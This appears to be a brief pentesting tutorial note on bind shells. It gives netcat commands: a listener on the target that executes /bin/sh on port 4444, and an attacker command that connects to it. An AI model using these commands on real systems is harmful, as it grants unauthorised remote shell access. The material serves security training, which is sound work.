# Bind Shell

In a bind shell you open a port on the victim machine and it listens for our connection into the machine.

You can also use netcat for this process

Step 1: Attack Machine

```jsx
nc IPADDRESS 4444
```

Step 2: Target Machine

```jsx
nc -lvp 4444 -e /bin/sh
```

Bind Shells are mostly used on External Assessments
